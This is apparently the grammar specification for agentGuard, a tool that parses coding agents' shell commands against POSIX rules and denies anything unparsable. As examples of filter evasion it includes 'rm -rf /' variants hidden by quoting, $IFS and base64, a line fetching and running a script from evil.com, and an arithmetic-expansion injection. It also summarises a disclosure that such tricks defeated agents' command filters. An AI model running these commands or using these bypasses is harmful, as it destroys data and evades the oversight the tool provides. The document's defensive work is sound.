# The accepted language

This file defines the language agentGuard's compiler accepts. It is the contract between the lexer, the parser and everything downstream, and it is normative: **a command that this grammar does not derive is not analysed, it is denied.** That rule is what makes the design defensible, so the grammar is the first thing to agree and the last thing to change.

Our base is the POSIX Shell Command Language, Open Group Base Specifications Issue 8, section 2 (`pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html`). We follow its token names and its grammar productions so that our accepted language is a documented subset of a standard rather than something we invented, and so a reviewer can check our parser against a specification. Section 2.3 gives the token recognition rules, 2.10.1 the lexical classification, and 2.10.2 the yacc grammar and the numbered parser-lexer interaction rules.

Two deliberate departures from POSIX, both in the direction of strictness, are described at the end.

## 1. Why we tokenize rather than match strings

The GuardFall disclosure (see `docs/related-work.md`) reports that quoting and expansion tricks defeated the command filters of ten of eleven open-source coding agents, and that the one which survived tokenized commands the way bash does. The reason is structural: a filter that inspects the raw string sees text the shell has not yet transformed, so `r"m" -rf /`, `rm$IFS-rf$IFS/` and `$(echo cm0= | base64 -d) -rf /` all read as harmless to a pattern and as `rm -rf /` to the shell.

The consequence for our design is that a token cannot be a plain string. Every token has to remember *how each part of it was written*, because that is what determines whether we know its value. POSIX supports this directly: section 2.3 rule 4 says quoting characters remain in the token during recognition, and grammar rule 1 notes that a quoted word is never a reserved word for exactly this reason. Expansion happens, per the standard, immediately before the command is executed and not at parse time, which is the gap we are stepping into.

## 2. Tokens

### 2.1 Operator tokens

The multi-character operators, with the POSIX names we use in code:

| Token | Symbol |
|---|---|
| `AND_IF` | `&&` |
| `OR_IF` | `\|\|` |
| `DSEMI` | `;;` |
| `SEMI_AND` | `;&` |
| `DLESS` | `<<` |
| `DGREAT` | `>>` |
| `LESSAND` | `<&` |
| `GREATAND` | `>&` |
| `LESSGREAT` | `<>` |
| `DLESSDASH` | `<<-` |
| `CLOBBER` | `>\|` |

The single-character operators, which POSIX writes as quoted literals in the grammar: `PIPE` `|`, `AMP` `&`, `SEMI` `;`, `LPAREN` `(`, `RPAREN` `)`, `LT` `<`, `GT` `>`.

Plus `NEWLINE`, which is a token and not an operator, and `EOF`.

The lexer must recognize every operator above even where the parser will reject it, so that an unsupported construct produces a precise diagnostic rather than a confusing one. `;;` only ever appears in `case`, which we do not accept, but reporting "case terminator outside a case statement" is far better than mis-tokenizing.

### 2.1b The bash-only operators

These are not in POSIX, and a POSIX-only lexer reads each of them as two or more separate tokens. That difference is not academic: it is a bypass, because our analysis would see one thing and the shell would do another. Each therefore gets its own token, which the parser then rejects by name.

| Token | Symbol | What a POSIX lexer sees | What bash does |
|---|---|---|---|
| `AND_GREAT` | `&>` | `&` then `>` — background, then truncate | redirect **both** streams to the file |
| `AND_DGREAT` | `&>>` | `&` then `>>` | both streams, appending |
| `PIPE_AND` | `\|&` | `\|` then `&` — pipe, then background | pipe **both** streams |
| `TRIPLE_LESS` | `<<<` | `<<` then `<` | here-string |
| `DSEMI_AND` | `;;&` | `;;` then `&` | `case` fall-through |

The first row is verified, not assumed: on bash 5.3.15, `ls /nonexistent &>cap.txt` puts the error message *inside* `cap.txt`, where the POSIX reading would background the command and leave the file empty. `tests/test_lexer.py::test_and_great_is_not_two_tokens` asserts we never emit `AMP` for it.

Two further bash divergences live in the word rules rather than the operators, and both are verified. A tilde expands in more places than at the start of a word: in a word shaped like an assignment, meaning a valid unquoted name followed by the first `=`, bash also expands it right after that `=` and after each unquoted `:` that follows, even when the word is an ordinary argument. So `dd of=~/x` writes under the home directory, while `--opt=~/x`, `a-b=~/x` and `a=b=~/x` are literal. What follows the tilde must be empty, a login name, or a directory-stack reference such as `~+` or `~-`; any quoted character or expansion there switches expansion off, so `~'/x'` and `~$x` both keep a literal `~`. All twenty-seven forms we tried are checked against bash in `compiler/tests/test_lexer.py`. And inside `$'...'`, an escape bash does not recognise keeps its backslash, so `$'\8'` is the two characters `\8` and not `8`.

### 2.2 Word tokens

POSIX classifies every delimited non-operator token as a generic `TOKEN` and then reclassifies it by context. The classification, from 2.10.1, applies in order:

1. If it is an operator, return that operator's token.
2. If the string is all digits and the delimiter is `<` or `>`, return `IO_NUMBER`.
3. If it is at least three characters, starts with `{`, ends with `}` and the delimiter is `<` or `>`, it may be `IO_LOCATION`. **We do not support this**; the lexer refuses it by name (`io-location-redirect`), since POSIX marks the form implementation-defined and an unspecified case is a rejection for us.
4. Otherwise return `TOKEN`.

Context then turns a `TOKEN` into one of:

- **`WORD`** — the general case: a command name, an argument, a redirection filename.
- **`ASSIGNMENT_WORD`** — a `name=value` in a command prefix, per rule 7: the token contains an unquoted `=` that is not inside an expansion, and the characters before the first such `=` form a valid name. A token beginning with `=` is a `WORD`.
- **`NAME`** — a valid name, needed only for `for` and function definitions, neither of which we accept; we keep the token type so the diagnostic is accurate.
- **`IO_NUMBER`** — the file descriptor number of a redirection.

Reserved words are recognized when no character of them is quoted and they appear in a reserved position. POSIX lists sixteen: `!` `{` `}` `case` `do` `done` `elif` `else` `esac` `fi` `for` `if` `in` `then` `until` `while`. We recognize all sixteen and accept only `!`; the rest are rejected by the parser as unsupported constructs. We also recognize `[[`, `]]`, `function`, `select` and `time`, which POSIX permits implementations to reserve, purely so they are rejected explicitly rather than silently treated as command names.

### 2.3 Word parts: the part that matters

A `WORD` is not a string. It is an ordered list of parts, each carrying its own kind, and this structure is the compiler's main defence:

| Part kind | Written as | Statically known? |
|---|---|---|
| `LITERAL` | bare text | yes |
| `ESCAPED` | `\c` | yes, value is `c` |
| `SQUOTED` | `'...'` | yes, verbatim |
| `DQUOTED` | `"..."` | yes for its literal spans; nested parts keep their own kinds |
| `ANSI_C_QUOTED` | `$'...'` | yes, after decoding the standard escapes |
| `PARAM_EXP` | `$name`, `${...}` | only if we are tracking that variable |
| `CMD_SUBST` | `$(...)`, backticks | **no** |
| `ARITH_EXP` | `$((...))` | no, except trivially constant expressions |
| `TILDE` | `~`, `~user` | yes for `~`, which is the session's home |
| `GLOB` | unquoted `*`, `?`, `[...]` | no: expands against the filesystem |
| `BRACE_EXP` | `{a,b}` | yes, it is textual and we can enumerate it |
| `PROC_SUBST` | `<(...)`, `>(...)` | **no**, and rejected outright |

A word is **resolved** when every one of its parts is statically known, and **unresolved** otherwise, and an unresolved word carries the reason. The whole policy layer keys off that distinction: an unresolved word can never be shown to be safe, so it is never allowed by default.

Two lexer obligations follow from POSIX and are easy to get wrong. Rule 5 says an unquoted `$` or backquote begins an expansion whose end the tokenizer must find, **recursively, including nested constructs**, keeping the text unmodified in the token; so `$(echo $(whoami))` is one `CMD_SUBST` part with nesting inside it, and the nesting depth is a signal we record. And escaped newlines are removed before tokenization (2.2.1), so a backslash-newline never separates tokens, which means `rm \` + newline + `-rf /` is one command and must be seen as such.

### 2.4 Token recognition

We implement the ten rules of POSIX 2.3 in order, and the test suite should assert each one by number:

1. At end of input, delimit the current token.
2. An unquoted character that extends the previous operator joins that operator.
3. An unquoted character that cannot extend the previous operator delimits it.
4. An unquoted backslash, single quote, double quote, or the `$` of `$'` begins quoting, which runs to the end of the quoted text. No substitution happens, the quoting characters stay in the token, and quoted text does not delimit the token.
5. An unquoted `$` or backquote begins an expansion; read to its end, recursively, keeping it unmodified.
6. An unquoted character that can begin an operator delimits the current token and starts an operator.
7. An unquoted blank delimits the current token and is discarded.
8. If the previous character was part of a word, append to that word.
9. A `#` begins a comment, discarded up to but not including the newline.
10. Otherwise, begin a new word.

Order matters in two places that are worth a test each: rule 4 consumes quoted characters before rules 8 and 9 see them, so a quoted `#` or a quoted operator is ordinary text; and rule 8 precedes rule 9, so the `#` in `a#b` is part of the word and not a comment.

Aliases (2.3.1) are substituted after a token is categorized. **We do not perform alias substitution**, and we reject the `alias` builtin, because an alias is a redefinition of what a later command name means and we cannot track it reliably. bashguard lists `alias ls='rm -rf /'` among its evasion rules for this reason.

## 3. The grammar

### 3.1 What we accept

EBNF over the tokens above, using POSIX production names so the correspondence is checkable. `empty` marks an empty alternative.

```
program           : linebreak complete_commands linebreak | linebreak
complete_commands : complete_commands newline_list complete_command | complete_command
complete_command  : list separator_op | list
list              : list separator_op and_or | and_or
and_or            : pipeline
                  | and_or AND_IF linebreak pipeline
                  | and_or OR_IF  linebreak pipeline
pipeline          : pipe_sequence | Bang pipe_sequence
pipe_sequence     : command | pipe_sequence PIPE linebreak command
command           : simple_command | subshell | subshell redirect_list
subshell          : LPAREN compound_list RPAREN
compound_list     : linebreak term | linebreak term separator
term              : term separator and_or | and_or
simple_command    : cmd_prefix cmd_word cmd_suffix | cmd_prefix cmd_word | cmd_prefix
                  | cmd_name cmd_suffix | cmd_name
cmd_name          : WORD
cmd_word          : WORD
cmd_prefix        : io_redirect | cmd_prefix io_redirect
                  | ASSIGNMENT_WORD | cmd_prefix ASSIGNMENT_WORD
cmd_suffix        : io_redirect | cmd_suffix io_redirect | WORD | cmd_suffix WORD
redirect_list     : io_redirect | redirect_list io_redirect
io_redirect       : io_file | IO_NUMBER io_file | io_here | IO_NUMBER io_here
io_file           : LT filename | LESSAND filename | GT filename | GREATAND filename
                  | DGREAT filename | LESSGREAT filename | CLOBBER filename
filename          : WORD
io_here           : DLESS here_end | DLESSDASH here_end
here_end          : WORD                                 -- quoted delimiter only
newline_list      : NEWLINE | newline_list NEWLINE
linebreak         : newline_list | empty
separator_op      : AMP | SEMI
separator         : separator_op linebreak | newline_list
```

**Command substitution is not in the production list above, and that is deliberate.** `$(...)` is not a token of its own: POSIX performs no substitution during token recognition, so the construct stays inside the word token with its characters unmodified, and `echo $(date)` is one `WORD`. But the text inside it is a shell program, and the standard requires the tokenizing rules to be reapplied recursively to find the matching `)` and embedded expansions to be processed recursively. So the recursion is in the word, not in the grammar:

```
CMD_SUBST part  ::  "$(" program ")"        -- a nested `program`, parsed by the same parser
```

The parser therefore calls itself on the captured inner text and stores the resulting node on the part. `MAX_NESTING_DEPTH` bounds the recursion, and a substitution whose inside does not parse makes the whole command a denial, exactly as at the top level. Backquoted substitution is refused outright by the lexer (`BACKQUOTE_SUBSTITUTION`), which removes the POSIX rationale's non-conforming end-of-word case along with it.

That is the whole accepted language: words with their quoting, assignments, simple commands, pipelines, `&&`/`||` lists, `;` and `&` separators, `!` negation, file redirections with optional file descriptors, and subshells. It covers, in our estimation, the large majority of what a coding agent actually runs, and it is small enough that two people can write a correct recursive-descent parser for it and test it exhaustively.

### 3.2 What we reject, and why

Rejection is a verdict, not a failure. Each of these produces a named diagnostic, and the gate turns it into a denial that says which construct was the problem.

**Control structures**: `if`, `while`, `until`, `for`, `case`, and `{ ...; }` brace groups. The grammar for them is in POSIX and we could add it, but every one introduces a loop or a branch, which means the effects of the command stop being a finite statically-known set. Deferred to future work by design, not by omission.

**Function definitions**: `fname() compound_command`. A definition changes what a name means for every later command, which is session state we would have to model as a mini-interpreter.

**Here-documents with an unquoted delimiter**: `cat <<EOF`. The body of one of these undergoes expansion, so its content is not determined by the source and we would be guessing at it. Named refusal: `heredoc-unquoted-delimiter`.

The **quoted** form, `cat <<'EOF'`, is accepted, and the earlier version of this document was wrong to reject both. The reason given then was that the body is attacker-controlled text of arbitrary length — but so is a single-quoted string, which we accept without difficulty. A quoted delimiter makes the body a pure literal, agents use the form constantly to write files and commit messages, and rejecting it would have cost us a large slice of ordinary commands for no security benefit. The lexer reads the body starting after the next `NEWLINE` per POSIX 2.7.4, strips leading tabs for `<<-`, and attaches it to the `DLESS` token as a `HEREDOC_BODY` part whose value is known.

**Process substitution**: `<(...)` and `>(...)`. These are a shell spawning a shell, with the inner command's output appearing as a filename. bashguard flags `bash <(curl https://evil.com/payload.sh)` as an evasion rule, and there is no benign use we need.

**`IO_LOCATION` redirections**: the `{name}<` form, which POSIX marks optional and implementation-defined.

Three more refusals came out of writing the parser. None was in the first version of this list, each is a place where the obvious parse is not what bash does, and each is a bypass if accepted:

**`((` at the start of a command** (`arithmetic-command`). It reads as two nested subshells, so `((ls))` looks like running `ls`. Bash reads it as an arithmetic command instead, and arithmetic evaluates the contents of the variables it names as code — verified on bash 5.3.15: after `x='a[$(printf RAN >&2)]'` and `ls=x`, the command `((ls))` runs the `printf`. The first assignment is a single-quoted literal with no effects of its own, so the two-step sequence would pass a per-command check. POSIX leaves `((` at command start unspecified for this reason. `( (ls) )` with a space is genuinely nested subshells and is accepted; the parser tells them apart by whether the two parentheses are adjacent.

**A command substitution inside a parameter or arithmetic expansion** (`substitution-in-expansion`), as in `${x:-$(id)}` or `$((1+$(id)))`. The lexer keeps those expansions as single opaque parts, so the substitution inside them would run without ever appearing in the AST. A substitution we cannot see is one we cannot parse, and that is a denial.

**`>&` or `<&` followed by anything but a descriptor number or `-`** (`bash-only-operator`). POSIX leaves `>&word` unspecified for a non-numeric word; bash reads `cmd >&file` as "send both output streams to `file`", which is a write. Parsed as a descriptor duplication it would carry no write effect at all, so the policy would never see that a file was created. An unresolvable target like `>&$FD` could expand to either and is refused for the same reason. Digit checks use ASCII only, since Python's `isdigit` accepts `٣` and bash does not.

**Backgrounding** is parsed, and recorded on the statement as `background`, rather than refused here. `&` is ordinary POSIX, and a denial that cites a policy rule explains itself better than one citing a syntax error. The policy layer is expected to refuse it, because a backgrounded command's effects land at an unknown time relative to the later commands in the session.

### 3.3 Parser-lexer interaction

POSIX's numbered rules exist because shell tokenization is context-dependent. The three we need:

- **Rule 1** (command name): if the token is exactly a reserved word, return that reserved word's token; otherwise `WORD`. Quoting defeats this, by design, because quote characters are still in the token.
- **Rule 7** (assignment preceding a command name): the first word, if exactly a reserved word, is that reserved word. Otherwise, if the token contains an unquoted `=` that is not inside an expansion, then a leading `=` makes it a `WORD`, a valid name before the first `=` makes it an `ASSIGNMENT_WORD`, and anything else is implementation-defined. **We resolve the implementation-defined case as a rejection**, since a token like `a-b=c` in prefix position is more likely obfuscation than intent.
- Of rules 2 through 9, the rest apply only to constructs we reject, except that POSIX's note that the highest-numbered applicable rule wins is worth encoding as a comment where it bites.

One context-dependence to watch: `IO_NUMBER` depends on the *delimiter* that follows the digits, so `2>file` is a redirection on fd 2 while `echo 2 > file` is the word `2` plus a redirection. The lexer therefore needs one character of lookahead at token delimitation, and both cases belong in the tests.

## 4. Our two departures from POSIX

**We reject where POSIX leaves behaviour unspecified.** The standard has several "unspecified" and "implementation-defined" outcomes, such as rule 7's malformed assignment, words ending in `:`, and the optional reserved words. A shell may choose freely; a security tool may not, because a divergence between our choice and the real shell's is exactly a bypass. Every unspecified case is a rejection.

**We never expand, we only resolve.** POSIX says word expansion happens immediately before execution. We do not execute, so we never expand; we only decide whether a word's value is statically determined. Globs are the clearest case: `rm *` is a perfectly valid command whose effect set depends on the filesystem at execution time, so its target is unresolved and the policy layer must treat it as such rather than guessing. This is also where we differ from the prior tools, which normalize and decode in order to produce a string to match against. Normalization is lossy; refusal to decide is not.

## 5. Test obligations

The parser is not done until these hold, and each should be a named test:

- `ParseError` is the only exception that escapes `parse`, for any token list the lexer can produce — the parser's counterpart to the lexer's fail-closed property test, and the thing the gate's two failure paths rest on. See `docs/decisions.md` for why the parser raises rather than collecting diagnostics.
- A command substitution whose inside does not parse is a denial of the whole command, with the inner diagnostic, not a word marked unresolved.
- Each of the ten token-recognition rules, asserted individually by rule number.
- Every operator token, including those the parser rejects.
- Quoting: `grep '2>&1' file` has three words and no redirection; `echo "a b"` has two words; `echo a\ b` has two words; `$'\x41'` resolves to `A`.
- Quoting defeats reserved words: `"if"` is a command name, not `If`.
- `IO_NUMBER` versus word: `2>file` against `echo 2 > file`.
- Rule 7: `A=1 cmd` has an `ASSIGNMENT_WORD` prefix; `=1 cmd` has a `WORD`; `a-b=c cmd` is rejected.
- Nesting depth of `CMD_SUBST` is recorded, and `$(echo $(whoami))` reports depth two.
- Escaped newline does not split a command.
- Every rejected construct produces its own diagnostic, naming the construct.
- Each bash-only operator in section 2.1b produces its own token, and `&>` never becomes `AMP`.
- Here-documents: a quoted delimiter captures the body literally; `<<-` strips leading tabs; an unquoted delimiter and an unterminated body are each a named refusal.
- A differential test against `bash -n`: for a corpus of commands, if `bash -n` accepts and we reject, that is expected and the construct must be in the rejected list above; if `bash -n` rejects and we accept, that is a bug. `bash -n` only checks syntax and runs nothing, which keeps the "never execute what we analyse" rule intact. Using `tree-sitter-bash` as a second oracle is also fair, in tests only.
- An argv oracle, which is the test that actually matters, and which needs the narrow exception recorded in `AGENTS.md`: for generated literal words, compare our value against the argument bash really passes, obtained with `printf '%s\0'`. A first run of twelve words agreed on eleven and found one genuine lexer bug, the `$'\8'` case above. The twelfth was the tilde, which the lexer is not supposed to resolve.

Status: the lexer and the parser both satisfy these, in `compiler/tests/test_lexer.py` and `compiler/tests/test_parser.py`, 170 tests together. The `bash -n` differential runs on a 36-command corpus: no command we accept is rejected by bash, which is the direction that would be a bug, and every command bash accepts but we refuse carries a code naming the construct. On Windows, pass the script to bash over **stdin** rather than as an argument to `-c`: `subprocess` rebuilds an argv list into a command line using the MS C runtime quoting rules, which rewrite backslashes and corrupt exactly the inputs an argv oracle exists to test. That cost us one false disagreement before we spotted it.
